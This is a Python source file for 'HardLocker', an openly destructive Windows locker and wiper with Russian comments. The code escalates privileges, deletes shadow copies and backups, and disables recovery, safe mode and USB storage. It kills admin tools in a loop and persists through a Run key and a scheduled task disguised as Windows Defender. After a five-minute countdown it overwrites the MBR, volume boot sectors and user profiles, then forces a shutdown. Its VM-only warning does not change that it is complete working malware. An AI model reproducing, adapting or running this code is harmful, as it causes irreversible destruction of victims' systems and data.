# language: Python, file: hardlocker.py
# Зависимости: pillow pygame psutil wmi pywin32
# Сборка: pyinstaller --noconsole --onedir --name hardlocker --add-data "assets;assets" --add-data "scream.mp3;." hardlocker.py
# ВНИМАНИЕ: деструктивный код. ТОЛЬКО VM СО СНАПШОТОМ. Через 5 минут — MBR/VBR/профили/shutdown.

import ctypes
import json
import os
import random
import shutil
import string
import subprocess
import sys
import threading
import time
from ctypes import wintypes

import psutil

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

try:
    import win32api
    import win32con
    HAS_PYWIN32 = True
except ImportError:
    HAS_PYWIN32 = False

# ================= НАСТРОЙКИ =================
OPERATOR = "pu709"
DESTROY_SECONDS = 300  # 5 минут

BLOCK_NAMES = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "format.com",
    "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe",
    "autoruns.exe", "autoruns64.exe", "psexec.exe", "psexec64.exe",
    "wmic.exe", "cscript.exe", "wscript.exe", "mshta.exe",
    "reg.exe", "sc.exe", "net.exe", "net1.exe", "rundll32.exe",
    "regsvr32.exe", "msiexec.exe", "control.exe", "mmc.exe",
    "tasklist.exe", "taskkill.exe", "schtasks.exe", "bcdedit.exe",
    "reagentc.exe", "vssadmin.exe", "wbadmin.exe", "diskshadow.exe",
    "chkdsk.exe", "bootrec.exe", "sfc.exe", "dism.exe",
    "bcdboot.exe", "certutil.exe", "bitsadmin.exe", "curl.exe",
    "py.exe", "pyw.exe", "python.exe", "pythonw.exe",
}

BLOCK_PATHS = {
    r"c:\windows\system32\taskmgr.exe",
    r"c:\windows\system32\cmd.exe",
    r"c:\windows\system32\regedit.exe",
    r"c:\windows\system32\powershell.exe",
    r"c:\windows\system32\windowspowershell\v1.0\powershell.exe",
    r"c:\windows\system32\mmc.exe",
    r"c:\windows\system32\control.exe",
    r"c:\windows\system32\tasklist.exe",
    r"c:\windows\system32\taskkill.exe",
    r"c:\windows\system32\shutdown.exe",
    r"c:\windows\system32\wbem\wmiprvse.exe",
}

BLOCK_CMDLINE_TOKENS = (
    "taskmgr", "regedit", "processhacker", "msconfig",
    "powershell", "pwsh", "cmd.exe /c", "wmic",
)

_SELF_PID = os.getpid()
_STOP_FLAG = threading.Event()

APPDATA = os.environ.get("APPDATA", ".")
BASE_DIR = os.path.join(APPDATA, "HardLocker")
STATE_FILE = os.path.join(BASE_DIR, "state.dat")
WATCHDOG_PID_FILE = os.path.join(BASE_DIR, "watchdog.pid")
REBOOT_TRIGGER = os.path.join(BASE_DIR, "reboot.trigger")
MASQ_DIR = os.path.join(APPDATA, "Microsoft")
MASQ_SCRIPT = os.path.join(MASQ_DIR, "explorer.py")

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C
FILE_FLAG_WRITE_THROUGH = 0x80000000
DRIVE_FIXED = 3

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE,
]
kernel32.WriteFile.argtypes = [
    wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.SetFilePointerEx.argtypes = [
    wintypes.HANDLE, ctypes.c_longlong,
    ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD,
]
kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.GetDriveTypeW.argtypes = [wintypes.LPCWSTR]
kernel32.GetDriveTypeW.restype = wintypes.UINT
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.FlushFileBuffers.argtypes = [wintypes.HANDLE]
kernel32.FlushFileBuffers.restype = wintypes.BOOL
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
kernel32.GetExitCodeProcess.restype = wintypes.BOOL

STILL_ACTIVE = 259

# ================= DISPLAY (правильный DEVMODEW) =================
# На x64 dmSize = 220. Используем "сырой" буфер, чтобы не промахнуться с union.
def set_fullhd():
    """Смена разрешения на 1920x1080 через ChangeDisplaySettingsExW."""
    try:
        # DM_PELSWIDTH=0x80000, DM_PELSHEIGHT=0x100000, DM_DISPLAYFREQUENCY=0x400000
        dm_fields = 0x80000 | 0x100000 | 0x400000
        buf = ctypes.create_string_buffer(220)  # DEVMODEW x64 size
        # dmDeviceName (32 WCHAR) — оставляем пустым
        # dmSpecVersion=0x0401 (WORD) offset 64, dmDriverVersion=0x0401 offset 66
        ctypes.memmove(ctypes.addressof(buf) + 64, (0x0401).to_bytes(2, "little"), 2)
        ctypes.memmove(ctypes.addressof(buf) + 66, (0x0401).to_bytes(2, "little"), 2)
        # dmSize=220 offset 68
        ctypes.memmove(ctypes.addressof(buf) + 68, (220).to_bytes(2, "little"), 2)
        # dmFields offset 72 (DWORD)
        ctypes.memmove(ctypes.addressof(buf) + 72, dm_fields.to_bytes(4, "little"), 4)
        # dmPelsWidth offset 172, dmPelsHeight offset 176, dmDisplayFrequency offset 180
        ctypes.memmove(ctypes.addressof(buf) + 172, (1920).to_bytes(4, "little"), 4)
        ctypes.memmove(ctypes.addressof(buf) + 176, (1080).to_bytes(4, "little"), 4)
        ctypes.memmove(ctypes.addressof(buf) + 180, (60).to_bytes(4, "little"), 4)
        user32.ChangeDisplaySettingsExW(None, buf, None, 0, None)
    except Exception:
        pass

# ================= UAC =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

# ================= HELPERS =================
def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)

def reg_set_hkcu(path, name, value, vtype=1):
    import winreg
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False

# ================= SELF-MASQUERADE =================
def self_masquerade():
    try:
        os.makedirs(MASQ_DIR, exist_ok=True)
        src = os.path.abspath(__file__)
        dst = MASQ_SCRIPT
        if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
            shutil.copy2(src, dst)
        return dst
    except Exception:
        return None

# ================= LIVE-USB (юзермод) =================
def block_live_usb():
    """Флешка не монтируется в Windows. Загрузку с USB это НЕ останавливает."""
    try:
        subprocess.run(["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR",
                        "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass
    try:
        subprocess.run(["mountvol", "/N"], capture_output=True,
                       creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass
    try:
        subprocess.run(["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices",
                        "/v", "Deny_All", "/t", "REG_DWORD", "/d", "1", "/f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass

# ================= RECOVERY / SAFE MODE OFF =================
def disable_recovery_and_safe_mode():
    for c in (
        ["reagentc", "/disable"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
        ["bcdedit", "/set", "{bootmgr}", "displaybootmenu", "No"],
        ["bcdedit", "/set", "{default}", "bootmenupolicy", "Legacy"],
        ["vssadmin", "delete", "shadows", "/all", "/quiet"],
        ["wbadmin", "delete", "catalog", "-quiet"],
    ):
        try:
            subprocess.run(c, capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        except Exception:
            pass
    # SafeBoot — safe mode УПАДЁТ, но не «не запустится». Это максимум из юзермода.
    for k in (r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
              r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"):
        try:
            subprocess.run(["reg", "delete", k, "/f"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
        except Exception:
            pass

# ================= DISK =================
def _open_drive0():
    h = kernel32.CreateFileW(
        r"\\.\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
    )
    if not h or h == INVALID_HANDLE_VALUE:
        return None
    return h

def _write_at(h, offset, data):
    kernel32.SetFilePointerEx(h, ctypes.c_longlong(offset), None, 0)
    written = wintypes.DWORD(0)
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    ok = kernel32.WriteFile(h, buf, len(data), ctypes.byref(written), None)
    kernel32.FlushFileBuffers(h)
    return bool(ok)

def wipe_mbr():
    h = _open_drive0()
    if not h:
        return False
    try:
        junk = bytearray(os.urandom(512))
        junk[510] = 0
        junk[511] = 0
        if not _write_at(h, 0, bytes(junk)):
            return False
        _write_at(h, 512, b"\xFF" * 4096)
        length = ctypes.c_ulonglong(0)
        ret = wintypes.DWORD(0)
        kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                                 None, 0, ctypes.byref(length), 8,
                                 ctypes.byref(ret), None)
        if length.value > 1024:
            _write_at(h, length.value - 512, b"\xFF" * 512)
        return True
    finally:
        kernel32.CloseHandle(h)

def enumerate_fixed_volumes():
    vols = []
    for L in string.ascii_uppercase:
        root = f"{L}:\\"
        try:
            if kernel32.GetDriveTypeW(root) == DRIVE_FIXED and os.path.exists(root):
                vols.append(f"{L}:")
        except Exception:
            continue
    return vols

def nuke_all_volumes():
    for drive in enumerate_fixed_volumes():
        try:
            h = kernel32.CreateFileW(
                f"\\\\.\\{drive}",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
            )
            if not h or h == INVALID_HANDLE_VALUE:
                continue
            try:
                _write_at(h, 0, os.urandom(512))
                _write_at(h, 512, b"\xFF" * 4096)
                length = ctypes.c_ulonglong(0)
                ret = wintypes.DWORD(0)
                kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                                         None, 0, ctypes.byref(length), 8,
                                         ctypes.byref(ret), None)
                if length.value > 1024:
                    _write_at(h, length.value - 512, b"\xFF" * 512)
            finally:
                kernel32.CloseHandle(h)
        except Exception:
            pass

def list_user_profiles():
    base = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
    out = []
    if not os.path.isdir(base):
        return out
    skip = {"public", "default", "default user", "all users"}
    try:
        for name in os.listdir(base):
            p = os.path.join(base, name)
            if os.path.isdir(p) and name.lower() not in skip:
                out.append(p)
    except Exception:
        pass
    return out

def shred_dir(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for f in files:
            fp = os.path.join(root, f)
            try:
                size = os.path.getsize(fp)
                if 0 < size < 64 * 1024 * 1024:
                    with open(fp, "r+b", buffering=0) as fh:
                        left = size
                        chunk = os.urandom(65536)
                        while left > 0:
                            n = min(left, len(chunk))
                            fh.write(chunk[:n])
                            left -= n
                        fh.flush()
                        os.fsync(fh.fileno())
            except Exception:
                pass
            try:
                os.remove(fp)
            except Exception:
                pass
        for d in dirs:
            try:
                os.rmdir(os.path.join(root, d))
            except Exception:
                pass
    try:
        os.rmdir(path)
    except Exception:
        pass

def nuke_users():
    for prof in list_user_profiles():
        try:
            shred_dir(prof)
        except Exception:
            pass
    for prof in list_user_profiles():
        try:
            subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", prof],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=60)
        except Exception:
            pass

def full_destroy():
    try:
        wipe_mbr()
    except Exception:
        pass
    try:
        nuke_all_volumes()
    except Exception:
        pass
    try:
        nuke_users()
    except Exception:
        pass
    try:
        with open(STATE_FILE, "w") as f:
            f.write("DESTROYED")
    except Exception:
        pass
    try:
        subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
                         creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

# ================= PROCESS KILL =================
def _proc_blocked(proc):
    try:
        info = proc.info
        cmd = " ".join(info.get("cmdline") or []).lower()
        if "--watchdog" in cmd:
            return False
        exe = (info.get("exe") or "").lower()
        if "appdata" in exe and "explorer.py" in exe:
            return False
        name = (info.get("name") or "").lower()
        if name in BLOCK_NAMES:
            return True
        if exe in BLOCK_PATHS:
            return True
        for tok in BLOCK_CMDLINE_TOKENS:
            if tok in cmd:
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
    return False

def kill_blocked():
    for proc in psutil.process_iter(["name", "exe", "cmdline", "ppid", "pid"]):
        try:
            if proc.info.get("pid") == _SELF_PID:
                continue
            if proc.info.get("ppid") == _SELF_PID:
                continue
            if _proc_blocked(proc):
                proc.kill()
        except Exception:
            pass

def blocking_loop():
    while not _STOP_FLAG.is_set():
        kill_blocked()
        time.sleep(0.02)

# ================= WATCHDOG (только после старта) =================
def _parent_alive(pid):
    try:
        p = kernel32.OpenProcess(0x1000, False, pid)
        if not p:
            return False
        ec = wintypes.DWORD(0)
        kernel32.GetExitCodeProcess(p, ctypes.byref(ec))
        kernel32.CloseHandle(p)
        return ec.value == STILL_ACTIVE
    except Exception:
        return False

def watchdog_main(parent_pid):
    while True:
        if os.path.exists(REBOOT_TRIGGER):
            full_destroy()
            break
        if not _parent_alive(parent_pid):
            full_destroy()
            break
        time.sleep(0.5)

def spawn_watchdog():
    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
    args = [sys.executable, script, "--watchdog", str(_SELF_PID)]
    try:
        proc = subprocess.Popen(args, creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
                                close_fds=True)
        with open(WATCHDOG_PID_FILE, "w") as f:
            f.write(str(proc.pid))
        return proc
    except Exception:
        return None

# ================= SOUND =================
_scream_path = None

def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None

def init_scream():
    global _scream_path
    if not HAS_PYGAME:
        return
    path = resource_path("scream.mp3")
    if not path:
        return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        _scream_path = path
    except Exception:
        _scream_path = None

# ================= FAKE ERRORS =================
def fake_error_messagebox(title, text):
    try:
        # MB_ICONERROR | MB_TOPMOST | MB_SYSTEMMODAL
        user32.MessageBoxW(0, text, title, 0x00000010 | 0x00040000 | 0x00001000)
    except Exception:
        pass

# ================= UI =================
def run_ui():
    import tkinter as tk
    from PIL import Image, ImageTk

    win = tk.Tk()
    win.title(f"HardLocker — {OPERATOR}")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    win.update_idletasks()

    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            img = Image.open(eye_path).resize((420, 200))
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(win, image=photo, bg="#000000", bd=0)
            lbl.image = photo
            lbl.place(relx=0.5, rely=0.35, anchor="center")
        except Exception:
            tk.Label(win, text="[Eye Error]", fg="red", bg="black").place(relx=0.5, rely=0.35, anchor="center")

    boot_text = (
        "WINDOWS SECURITY ALERT\n\n"
        "Your system has been locked by Qack.\n"
        "All recovery options are disabled.\n"
        "Safe mode is disabled. Live USB is disabled.\n\n"
        "Press START. After 5 minutes — full destroy."
    )
    tk.Label(win, text=boot_text, fg="#FF0000", bg="#000000",
             font=("Consolas", 14), justify="center").pack(pady=(0, 20))

    timer_label = tk.Label(win, text="", fg="#FF0000", bg="#000000",
                           font=("Consolas", 18, "bold"))
    timer_label.pack(pady=10)

    state = {"started": False, "deadline": 0.0}

    def tick():
        if not state["started"]:
            win.after(500, tick)
            return
        left = int(state["deadline"] - time.time())
        if left <= 0:
            timer_label.config(text="ВРЕМЯ ВЫШЛО")
            try:
                full_destroy()
            except Exception:
                pass
            return
        m, s = divmod(left, 60)
        timer_label.config(text=f"До сноса: {m:02d}:{s:02d}")
        win.after(500, tick)

    def show_error_1():
        threading.Thread(target=fake_error_messagebox, args=(
            "ERROR",
            "Необрабатываемое исключение в приложении.\n"
            "При нажатии кнопки \"Продолжить\" приложение проигнорирует ошибку и попытается продолжить работу.\n"
            "При нажатии кнопки \"Выход\" приложение немедленно завершит работу."
        ), daemon=True).start()
        win.after(1500, show_error_2)

    def show_error_2():
        threading.Thread(target=fake_error_messagebox, args=(
            "Connection error",
            "The request was aborted: Could not create SSL/TLS secure channel."
        ), daemon=True).start()
        win.after(1500, show_error_3)

    def show_error_3():
        threading.Thread(target=fake_error_messagebox, args=(
            "Connection failed",
            "Попытка установить соединение была безуспешной, т.к. от другого компьютера "
            "за требуемое время не получен нужный отклик, или было разорвано уже установленное "
            "соединение из-за неверного отклика уже подключенного компьютера\n"
            "192.168.1.108:4444"
        ), daemon=True).start()

    def start_sequence():
        if state["started"]:
            return
        state["started"] = True
        state["deadline"] = time.time() + DESTROY_SECONDS
        set_fullhd()
        spawn_watchdog()  # watchdog только после старта
        show_error_1()
        # Запускаем зацикленное видео-«крик» (если есть)
        if HAS_PYGAME and _scream_path:
            try:
                pygame.mixer.music.load(_scream_path)
                pygame.mixer.music.play(-1)
            except Exception:
                pass

    tk.Button(win, text="НАЧАТЬ", command=start_sequence,
              bg="#4CAF50", fg="#FFFFFF", font=("Consolas", 20, "bold"),
              bd=0, padx=60, pady=20).pack(pady=20)

    tk.Label(win, text="Попытка recovery / safe mode / live-USB → НЕЛЬЗЯ",
             fg="#333333", bg="#000000", font=("Consolas", 10)).pack(side="bottom", pady=10)

    tick()
    win.mainloop()

# ================= ENTRY =================
def main():
    if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
        try:
            parent = int(sys.argv[2])
        except Exception:
            parent = 0
        watchdog_main(parent)
        return

    ensure_admin()

    block_live_usb()
    disable_recovery_and_safe_mode()

    # Автозапуск
    try:
        line = f'"{sys.executable}"' if getattr(sys, "frozen", False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "explorer", 0, winreg.REG_SZ, line)
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/create", "/tn", "WindowsDefenderUpdate", "/tr",
                        f'"{sys.executable}"' if getattr(sys, "frozen", False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"',
                        "/sc", "onlogon", "/rl", "highest", "/f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
    except Exception:
        pass

    self_masquerade()
    init_scream()

    threading.Thread(target=blocking_loop, daemon=True).start()

    run_ui()

if __name__ == "__main__":
    main()
